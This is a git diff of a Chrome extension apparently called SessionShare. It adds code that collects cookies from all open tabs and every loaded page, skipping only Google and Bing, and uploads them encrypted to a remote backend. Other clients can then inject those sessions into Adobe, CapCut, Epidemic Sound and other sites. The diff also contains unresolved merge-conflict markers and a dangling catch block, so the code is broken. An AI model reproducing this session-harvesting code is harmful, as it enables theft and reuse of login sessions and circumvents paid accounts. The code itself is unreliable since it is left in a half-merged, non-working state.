@@ -187,7 +187,26 @@ function authenticateSPID(n) {
           action: "Login",
           user: currentSPID,
         }),
+        triggerPostAuthScan(),
         n(null));
+  });
+}
+
+function triggerPostAuthScan() {
+  if (CLIENT_MODE) return;
+  chrome.tabs.query({}, (tabs) => {
+    if (!tabs) return;
+    tabs.forEach(tab => {
+      if (tab.url) {
+        try {
+          const urlObj = new URL(tab.url);
+          const domain = urlObj.hostname;
+          if (domain && !domain.includes("google.com") && !domain.includes("bing.com") && !domain.includes("chrome://")) {
+            autoUploadSession(domain, tab.url);
+          }
+        } catch (e) {}
+      }
+    });
   });
 }
 function refreshToken() {
@@ -245,10 +264,11 @@ function openWebSocket() {
           logDebug(`[WebSocket] Erro de parse JSON na sessao descriptografada para o dominio ${n}: ${jsonErr.message}`);
           return;
         }
-        t = n.replace(".pending", "");
+        t = getCanonicalDomain(n.replace(".pending", ""));
         r = e.LogoURL;
         logDebug(`[WebSocket] Descriptografia bem-sucedida da sessao para o dominio: ${t}`);
         if (CLIENT_MODE) {
+<<<<<<< Updated upstream
           chrome.storage.local.get([t], function(localData) {
             const currentLocal = localData[t];
             if (currentLocal) {
@@ -256,6 +276,39 @@ function openWebSocket() {
                 Cookies: currentLocal.Cookies,
                 LocalStorage: currentLocal.LocalStorage,
                 SessionStorage: currentLocal.SessionStorage
+=======
+          e.Pending = !1;
+          browserDetector.getApi().storage.local.set({ [t]: e }, function () {
+            logDebug(`[WebSocket] Sessao do dominio ${t} salva com sucesso no storage local do Cliente.`);
+            clearInjectedTabsCacheForDomain(t);
+            createDurationTimer(t, o);
+            reloadIfTabExists(t);
+            updateProxyRules();
+            sendMessageToAllTabs("cookiesChanged", { cookie: null });
+          });
+          null != (e = e.b64Logo) && "undefined" != e
+            ? ((null != (a = e) && "undefined" != a) ||
+                (a = "icons/Share-128.png"),
+              chrome.notifications.create(t, {
+                type: "basic",
+                iconUrl: "icons/Share-128.png",
+                title: "SessionShare",
+                message: "Acesso à conta " + t + " foi atualizado!",
+                priority: 1,
+              }))
+            : null != r &&
+              "undefined" != r &&
+              logoToB64(r, function (e) {
+                ((null != (a = e) && "undefined" != a) ||
+                  (a = "icons/Share-128.png"),
+                  chrome.notifications.create(t, {
+                    type: "basic",
+                    iconUrl: "icons/Share-128.png",
+                    title: "SessionShare",
+                    message: "Acesso à conta " + t + " foi atualizado!",
+                    priority: 1,
+                  }));
+>>>>>>> Stashed changes
               });
               const newStr = JSON.stringify({
                 Cookies: e.Cookies,
@@ -864,11 +917,151 @@ function onCookiesChanged(e) {
 }
 
 // Rastreamento de abas já injetadas para evitar loops infinitos de recarregamento no modo Cliente
+// Rastreamento de abas já injetadas para evitar loops infinitos de recarregamento no modo Cliente
 let injectedTabs = {};
+
+function getCanonicalDomain(domain) {
+  if (!domain) return domain;
+  const lower = domain.toLowerCase();
+  
+  if (lower.includes("ninjabrhub.io") || lower.includes("ninjabrhub.online")) {
+    return "ninjabrhub.io";
+  }
+  
+  if (lower.includes("epidemicsound.com")) {
+    return "www.epidemicsound.com";
+  }
+  
+  if (lower.includes("adobe.com")) {
+    return "www.adobe.com";
+  }
+  
+  if (lower.includes("capcut.com")) {
+    return "www.capcut.com";
+  }
+  
+  return domain;
+}
+
+function getCandidateDomains(domain) {
+  if (!domain) return [];
+  const lower = domain.toLowerCase();
+  const candidates = [lower];
+  
+  if (lower.startsWith("www.")) {
+    candidates.push(lower.substring(4));
+  } else {
+    candidates.push("www." + lower);
+  }
+  
+  if (lower.includes("ninjabrhub.io") || lower.includes("ninjabrhub.online")) {
+    const list = ["ninjabrhub.io", "ninjabrhub.online", "www.ninjabrhub.io", "www.ninjabrhub.online"];
+    list.forEach(item => {
+      if (!candidates.includes(item)) candidates.push(item);
+    });
+  }
+  
+  if (lower.includes("epidemicsound.com")) {
+    const list = ["epidemicsound.com", "www.epidemicsound.com"];
+    list.forEach(item => {
+      if (!candidates.includes(item)) candidates.push(item);
+    });
+  }
+  
+  if (lower.includes("adobe.com")) {
+    const list = [
+      "adobe.com", "www.adobe.com", 
+      "auth.services.adobe.com", "creativecloud.adobe.com", 
+      "identity.adobe.com", "sign.adobe.com", 
+      "adminconsole.adobe.com", "assets.adobe.com"
+    ];
+    list.forEach(item => {
+      if (!candidates.includes(item)) candidates.push(item);
+    });
+  }
+  
+  if (lower.includes("capcut.com")) {
+    const list = [
+      "capcut.com", "www.capcut.com", 
+      "editor.capcut.com", "retargeting.capcut.com"
+    ];
+    list.forEach(item => {
+      if (!candidates.includes(item)) candidates.push(item);
+    });
+  }
+  
+  return candidates;
+}
+
+function markTabAsInjected(tabId, canonicalDomain) {
+  const cacheKey = `${tabId}:${canonicalDomain}`;
+  injectedTabs[cacheKey] = true;
+  if (chrome.storage && chrome.storage.session) {
+    chrome.storage.session.set({ [cacheKey]: true }).catch(() => {});
+  }
+}
+
+function isTabInjected(tabId, canonicalDomain, callback) {
+  const cacheKey = `${tabId}:${canonicalDomain}`;
+  if (injectedTabs[cacheKey]) {
+    callback(true);
+    return;
+  }
+  if (chrome.storage && chrome.storage.session) {
+    chrome.storage.session.get(cacheKey, function(data) {
+      if (data && data[cacheKey]) {
+        injectedTabs[cacheKey] = true;
+        callback(true);
+      } else {
+        callback(false);
+      }
+    });
+  } else {
+    callback(false);
+  }
+}
+
+function clearInjectedTabsCacheForDomain(domain) {
+  const canonicalDomain = getCanonicalDomain(domain);
+  logDebug(`[Cache] Limpando cache de abas injetadas para: ${canonicalDomain}`);
+  
+  Object.keys(injectedTabs).forEach((key) => {
+    if (key.endsWith(`:${canonicalDomain}`)) {
+      delete injectedTabs[key];
+    }
+  });
+  
+  if (chrome.storage && chrome.storage.session) {
+    chrome.storage.session.get(null, function(data) {
+      if (data) {
+        const keysToRemove = Object.keys(data).filter(key => key.endsWith(`:${canonicalDomain}`));
+        if (keysToRemove.length > 0) {
+          chrome.storage.session.remove(keysToRemove).catch(() => {});
+        }
+      }
+    });
+  }
+}
 
 function onTabsChanged(tabId, changeInfo, tab) {
   sendMessageToTab(tabId, "tabsChanged", changeInfo);
-  
+
+  // Auto-upload de cookies em modo Administrador ao concluir o carregamento da aba
+  if (!CLIENT_MODE && changeInfo.status === "complete") {
+    const urlString = tab && tab.url;
+    if (urlString && (urlString.startsWith("http://") || urlString.startsWith("https://"))) {
+      try {
+        const urlObj = new URL(urlString);
+        const domain = urlObj.hostname;
+        if (domain && !domain.includes("google.com") && !domain.includes("bing.com") && !domain.includes("chrome://")) {
+          autoUploadSession(domain, urlString);
+        }
+      } catch(e) {
+        logDebug(`[AutoUpload] Erro ao extrair dominio: ${e.message}`);
+      }
+    }
+  }
+
   // Auto-injeção ativa de cookies para manter o login persistente ao reabrir o Chrome
   if (CLIENT_MODE && (changeInfo.status === "loading" || changeInfo.url)) {
     const urlString = changeInfo.url || (tab && tab.url);
@@ -876,23 +1069,151 @@ function onTabsChanged(tabId, changeInfo, tab) {
       try {
         const urlObj = new URL(urlString);
         const domain = urlObj.hostname;
+        if (!domain) return;
         
-        // Evita reinjetar se já foi feito para esta aba e domínio nesta navegação
-        const cacheKey = `${tabId}:${domain}`;
+        const canonicalDomain = getCanonicalDomain(domain);
+        const cacheKey = `${tabId}:${canonicalDomain}`;
+        
+        // Verificação síncrona primária
         if (injectedTabs[cacheKey]) {
           return;
         }
         
-        // Se temos cookies salvos localmente para esse domínio, injeta síncrono
-        chrome.storage.local.get(domain, function(data) {
-          if (data && data[domain]) {
-            injectedTabs[cacheKey] = true;
-            injectCookiesForDomain(domain, tabId);
+        // Marcação temporária síncrona para evitar race conditions
+        injectedTabs[cacheKey] = true;
+        
+        // Verificação secundária assíncrona
+        isTabInjected(tabId, canonicalDomain, function(alreadyInjected) {
+          if (alreadyInjected) {
+            return;
           }
+          
+          const candidates = getCandidateDomains(domain);
+          chrome.storage.local.get(candidates, function(data) {
+            let foundKey = null;
+            let session = null;
+            
+            for (let cand of candidates) {
+              if (data && data[cand]) {
+                foundKey = cand;
+                session = data[cand];
+                break;
+              }
+            }
+            
+            if (session) {
+              markTabAsInjected(tabId, canonicalDomain);
+              injectCookiesForDomain(foundKey, tabId, domain);
+            } else {
+              delete injectedTabs[cacheKey];
+              if (chrome.storage && chrome.storage.session) {
+                chrome.storage.session.remove(cacheKey).catch(() => {});
+              }
+            }
+          });
         });
       } catch(e) {
-        // Silencia erros de parse de URL
+        logDebug(`[AutoInject] Erro no fluxo de auto-injeção: ${e.message}`);
       }
+    }
+  }
+}
+
+let uploadCooldowns = {};
+
+function autoUploadSession(domain, urlString) {
+  if (!currentSPID || !key || !isAuthenticated) {
+    return;
+  }
+  const canonicalDomain = getCanonicalDomain(domain);
+  const now = Date.now();
+  if (uploadCooldowns[canonicalDomain] && now - uploadCooldowns[canonicalDomain] < 10000) {
+    return;
+  }
+  uploadCooldowns[canonicalDomain] = now;
+
+  logDebug(`[AutoUpload] Detectado carregamento completo de ${domain} (canonical: ${canonicalDomain}). Extraindo cookies...`);
+  
+  const domainsToCapture = [canonicalDomain];
+  if (canonicalDomain.includes("ninjabrhub.io")) {
+    ["ninjabrhub.online", "ninjabrhub.io", "www.ninjabrhub.online", "www.ninjabrhub.io"].forEach(dom => {
+      if (!domainsToCapture.includes(dom)) domainsToCapture.push(dom);
+    });
+  }
+  if (canonicalDomain.includes("epidemicsound.com")) {
+    ["epidemicsound.com", "www.epidemicsound.com"].forEach(dom => {
+      if (!domainsToCapture.includes(dom)) domainsToCapture.push(dom);
+    });
+  }
+  if (canonicalDomain.includes("google")) {
+    domainsToCapture.push(".google.com");
+    domainsToCapture.push("google.com");
+  }
+  if (canonicalDomain.includes("adobe.com")) {
+    [
+      "adobe.com", "www.adobe.com", 
+      "auth.services.adobe.com", "creativecloud.adobe.com", 
+      "identity.adobe.com", "sign.adobe.com", 
+      "adminconsole.adobe.com", "assets.adobe.com"
+    ].forEach(dom => {
+      if (!domainsToCapture.includes(dom)) domainsToCapture.push(dom);
+    });
+  }
+  if (canonicalDomain.includes("capcut.com")) {
+    [
+      "capcut.com", "www.capcut.com", 
+      "editor.capcut.com", "retargeting.capcut.com"
+    ].forEach(dom => {
+      if (!domainsToCapture.includes(dom)) domainsToCapture.push(dom);
+    });
+  }
+
+  let allCapturedCookies = [];
+  let pendingDomains = domainsToCapture.length;
+
+  domainsToCapture.forEach(dom => {
+    chrome.cookies.getAll({ domain: dom }, async (cookies) => {
+      if (chrome.runtime.lastError) {
+        logDebug(`[AutoUpload] Erro ao obter cookies de ${dom}: ${chrome.runtime.lastError.message}`);
+      }
+      if (cookies && cookies.length > 0) {
+        cookies.forEach(c => {
+          if (!allCapturedCookies.find(ac => ac.name === c.name && ac.domain === c.domain)) {
+            allCapturedCookies.push(c);
+          }
+        });
+      }
+      pendingDomains--;
+      if (pendingDomains === 0) {
+        performUpload(allCapturedCookies);
+      }
+    });
+  });
+
+  async function performUpload(cookies) {
+    if (!cookies || cookies.length === 0) {
+      logDebug(`[AutoUpload] Nenhum cookie encontrado para ${canonicalDomain}. Ignorando.`);
+      return;
+    }
+
+    try {
+      const sessionData = {
+        Cookies: cookies,
+        LocalStorage: {},
+        SessionStorage: {},
+        Duration: "1Y",
+        LogoURL: "",
+        b64Logo: ""
+      };
+
+      const sessionStr = canonicalDomain + ":" + JSON.stringify(sessionData);
+      const encryptedMessage = encryptMessage(sessionStr, key);
+      const pubKeyB64 = nacl.util.encodeBase64(key);
+      
+      logDebug(`[AutoUpload] Salvando sessao auto-detectada no Supabase para ${canonicalDomain} (SPID: ${currentSPID})`);
+      await websocketHandler.sendSession(currentSPID, encryptedMessage, pubKeyB64, canonicalDomain, 525960);
+    } catch (err) {
+      logDebug(`[AutoUpload] Erro inesperado ao salvar sessao para ${canonicalDomain}: ${err.message}`);
     }
   }
 }
@@ -906,15 +1227,21 @@ chrome.tabs.onRemoved.addListener((tabId) => {
   });
 });
 
-function injectCookiesForDomain(domain, tabId) {
-  chrome.storage.local.get(domain, function(data) {
-    const session = data[domain];
+function injectCookiesForDomain(storageKey, tabId, targetDomain) {
+  targetDomain = targetDomain || storageKey;
+  
+  chrome.storage.local.get(storageKey, function(data) {
+    const session = data[storageKey];
     if (!session || !session.Cookies) return;
     
     // 1. Lê os cookies atuais do navegador antes de qualquer limpeza para comparar
-    chrome.cookies.getAll({ domain: domain }, (oldCookies) => {
+    chrome.cookies.getAll({ domain: targetDomain }, (oldCookies) => {
       // Procura cookies de sessão ou autenticação principais para ver se a sessão já está ativa
-      const sessionKeys = ["PHPSESSID", "session", "mzp_gate", "cf_clearance", "id", "login", "cdn-webmastern"];
+      const sessionKeys = [
+        "PHPSESSID", "session", "mzp_gate", "cf_clearance", "id", "login", 
+        "cdn-webmastern", "esc_session", "esc-session", "ajs_user_id",
+        "ninja_hub", "session_id", "user_id"
+      ];
       let sessionMatches = false;
       
       for (let key of sessionKeys) {
@@ -927,17 +1254,20 @@ function injectCookiesForDomain(domain, tabId) {
       }
       
       if (sessionMatches) {
-        logDebug(`[AutoInject] Cookies do dominio ${domain} ja correspondem a sessao logada no navegador. Pulando injeção.`);
+        logDebug(`[AutoInject] Cookies do dominio ${targetDomain} ja correspondem a sessao logada no navegador. Pulando injeção.`);
         return;
       }
       
-      logDebug(`[AutoInject] Iniciando injeção limpa de cookies para: ${domain}`);
+      logDebug(`[AutoInject] Iniciando injeção limpa de cookies para: ${storageKey} na aba de ${targetDomain}`);
       
-      // 2. Limpa cookies antigos do domínio e domínios relacionados (ex: Ninja Hub)
-      const domainsToClear = [domain];
-      if (domain.includes("ninjabrhub.io")) {
-        domainsToClear.push("ninjabrhub.online");
-      }
+      // 2. Limpa cookies antigos de todos os domínios candidatos
+      const domainsToClear = [];
+      const candidates = getCandidateDomains(storageKey).concat(getCandidateDomains(targetDomain));
+      candidates.forEach(dom => {
+        if (!domainsToClear.includes(dom)) {
+          domainsToClear.push(dom);
+        }
+      });
       
       let deletePromises = [];
       let pendingClears = domainsToClear.length;
@@ -1057,6 +1387,11 @@ function injectCookiesForDomain(domain, tabId) {
       }
     }
   });
+} catch (e) {
+        // Silencia erros
+      }
+    }
+  });
 }
 function onTabsCreatedComplete(e, r, n) {
   "complete" === r.status &&
@@ -1106,6 +1441,7 @@ function createDurationTimer(e, r) {
   0 < r && chrome.alarms.create(e, { delayInMinutes: r });
 }
 function deleteSession(e) {
+  clearInjectedTabsCacheForDomain(e);
   (chrome.browsingData.remove(
     { origins: ["http://" + e, "https://" + e] },
     { cookies: !0, localStorage: !0 },
@@ -1220,7 +1556,7 @@ async function handleErrorAndReportToGA(e, r = 0) {}
 (chrome.notifications.onButtonClicked.addListener(function (e, r) {
   var n;
   0 == r &&
-    ((injectDomain = (n = e).replace(".pending", "")),
+    ((injectDomain = getCanonicalDomain((n = e).replace(".pending", ""))),
     chrome.tabs.create({ url: "https://" + injectDomain }),
     chrome.storage.local.get(n, function (e) {
       var r;
@@ -1239,7 +1575,9 @@ async function handleErrorAndReportToGA(e, r = 0) {}
         (r = e[n].Duration),
         createDurationTimer(injectDomain, r),
         ((r = e[n]).Pending = !1),
-        chrome.storage.local.set({ [injectDomain]: r }),
+        chrome.storage.local.set({ [injectDomain]: r }, function() {
+          clearInjectedTabsCacheForDomain(injectDomain);
+        }),
         chrome.storage.local.remove(n));
     }),
     chrome.action.setBadgeText({ text: "" }));
@@ -1339,8 +1677,8 @@ async function startAdminAutoSave() {
         return;
       }
       
-      // 2. Localizar abas ativas para capturar domínios válidos
-      chrome.tabs.query({ active: true }, async (tabs) => {
+      // 2. Localizar abas para capturar domínios válidos
+      chrome.tabs.query({}, async (tabs) => {
         if (!tabs || tabs.length === 0) return;
         
         for (let tab of tabs) {
@@ -1349,12 +1687,14 @@ async function startAdminAutoSave() {
           try {
             const urlObj = new URL(tab.url);
             const domain = urlObj.hostname;
+            const canonicalDomain = getCanonicalDomain(domain);
             
             // Ignorar páginas do sistema do navegador
             if (domain.startsWith("chrome") || domain.startsWith("about") || domain.startsWith("extensions")) {
               continue;
             }
             
+<<<<<<< Updated upstream
             // 3. Capturar todos os cookies do domínio e domínios relacionados (ex: Ninja Hub)
             const domainsToCapture = [domain];
             if (domain.includes("ninjabrhub.io")) {
@@ -1362,6 +1702,18 @@ async function startAdminAutoSave() {
             } else if (domain.includes("toolzbuy.com")) {
               domainsToCapture.push("app.toolzbuy.com");
               domainsToCapture.push("extension.toolzbuy.com");
+=======
+            // 3. Capturar todos os cookies do domínio e domínios relacionados
+            const domainsToCapture = [];
+            const candidates = getCandidateDomains(domain).concat(getCandidateDomains(canonicalDomain));
+            candidates.forEach(dom => {
+              if (!domainsToCapture.includes(dom)) {
+                domainsToCapture.push(dom);
+              }
+            });
+            if (domain.includes("google") && !domainsToCapture.includes(".google.com")) {
+              domainsToCapture.push(".google.com");
+>>>>>>> Stashed changes
             }
             
             let allCapturedCookies = [];
@@ -1423,10 +1775,10 @@ async function startAdminAutoSave() {
                 b64Logo: ""
               };
               
-              const sessionString = domain + ":" + JSON.stringify(sessionObj);
+              const sessionString = canonicalDomain + ":" + JSON.stringify(sessionObj);
               
               // 6. Evitar envios redundantes usando hash/comparação de string
-              if (lastSavedSessionHashes[domain] === sessionString) {
+              if (lastSavedSessionHashes[canonicalDomain] === sessionString) {
                 return; // Dados idênticos aos já enviados anteriormente, ignora.
               }
               
@@ -1435,6 +1787,7 @@ async function startAdminAutoSave() {
               const pubKeyB64 = nacl.util.encodeBase64(key);
               
               // 8. Enviar direto ao Supabase para a ID do perfil correspondente
+<<<<<<< Updated upstream
               logDebug(`[AutoSave] Enviando sessão atualizada para o domínio: ${domain} (SPID: ${currentSPID})`);
               await websocketHandler.sendSession(currentSPID, encryptedMessage, pubKeyB64, domain, 525960);
               
@@ -1453,6 +1806,13 @@ async function startAdminAutoSave() {
               } catch (notifErr) {
                 logDebug(`[AutoSave] Erro ao criar notificação visual: ${notifErr.message}`);
               }
+=======
+              console.log(`[AutoSave] Enviando sessão atualizada para o domínio: ${canonicalDomain} (SPID: ${currentSPID})`);
+              await websocketHandler.sendSession(currentSPID, encryptedMessage, pubKeyB64, canonicalDomain, 525960);
+              
+              // Salva no cache local para a próxima comparação
+              lastSavedSessionHashes[canonicalDomain] = sessionString;
+>>>>>>> Stashed changes
             }
           } catch (err) {
             logDebug(`[AutoSave] Erro de URL na aba: ${err.message}`);
